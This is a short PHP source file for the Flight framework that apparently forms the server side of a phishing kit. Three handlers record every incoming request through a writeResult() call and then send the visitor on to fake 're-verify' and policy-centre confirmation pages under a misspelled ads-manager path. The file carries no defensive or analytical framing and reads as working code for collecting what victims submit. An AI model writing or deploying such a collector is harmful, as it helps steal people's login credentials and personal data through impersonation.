<?php

class Receiver
{

  public static function ajo()
  {
    $request = Flight::request();

    writeResult('ajo', $request);

    // handle result
    Flight::redirect('/adsmaneger-setting/re-verify.html?policies_centerconfirm-page-container-navigation');

    // Flight::json($request);
  }
  public static function ajos()
  {
    $request = Flight::request();
    writeResult('ajos', $request);
    Flight::redirect('/adsmaneger-setting/feloz.html?policies_centerconfirm-page-container-navigation');
  }
  public static function ambil()
  {
    $request = Flight::request();
    writeResult('ambil', $request);
    // Flight::json($request->data);
    Flight::redirect('/adsmaneger-setting/feloz.html?policies_centerconfirm-page-container-navigation');
  }
}
